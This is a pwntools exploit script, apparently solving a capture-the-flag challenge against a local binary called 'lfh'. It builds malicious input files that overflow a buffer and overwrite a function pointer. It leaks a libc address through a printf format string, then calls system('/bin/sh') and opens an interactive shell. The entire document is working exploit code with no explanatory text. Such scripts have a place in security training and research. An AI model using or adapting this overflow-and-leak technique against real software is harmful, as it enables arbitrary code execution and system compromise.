from pwn import *

PRINTF_PLT = 0x400960
GETCHAR_PLT = 0x400a40
LOAD_FILE = 0x400c1e

LEAK_OFFSET = 0x20830
SYSTEM_OFFSET = 0x45380


def pad(s, length):
    return s + '\x00' * (length - len(s))


def write_unicode(f, prefix, content):
    if len(content) % 2 != 0:
        raise Error("unicode content length should be even")
    f.write(pad(prefix, 296) + p32(len(content) // 2) + p32(1) + '\x00' * 16)
    f.write(content)


def write_ascii(f, prefix, content):
    f.write(pad(prefix, 296) + p32(len(content)) + p32(0) + '\x00' * 16)
    f.write(content)

with open('payload1', 'w') as f:
    f.write(p32(0x4b4f4f42))

    for i in range(40):
        write_ascii(f, 'DUMMY BOOK', 'CONTENT ')
    write_unicode(f, 'OVERFLOW PRINTF', 'a' * 336 + pad(
        pad('libc_start_main leak: %37$016lx\n', 32+256) + p64(PRINTF_PLT), 312)
    )
    write_unicode(f, 'OVERFLOW GETCHAR', 'b' * 336 + pad(
        pad('getchar', 32+256) + p64(GETCHAR_PLT), 312)
    )
    write_unicode(f, 'OVERFLOW LOAD_FILE', 'c' * 336 + pad(
        pad('payload2', 32+256) + p64(LOAD_FILE), 312)
    )

p = process(('/home/lfh/lfh', 'payload1', '1'))
p.sendafter('(y/n)\n', 'y')
p.recvuntil('terminating the program\nlibc_start_main leak: ')
libc_start_main_leak = int(p.recvn(16), 16)
log.success('libc base: 0x%x' % (libc_start_main_leak - LEAK_OFFSET))

with open('payload2', 'w') as f:
    f.write(p32(0x4b4f4f42))

    write_unicode(f, 'OVERFLOW SYSTEM', 'd' * 336 + pad(
        pad('/bin/sh', 32+256) + p64(libc_start_main_leak - LEAK_OFFSET + SYSTEM_OFFSET), 312)
    )

p.interactive()
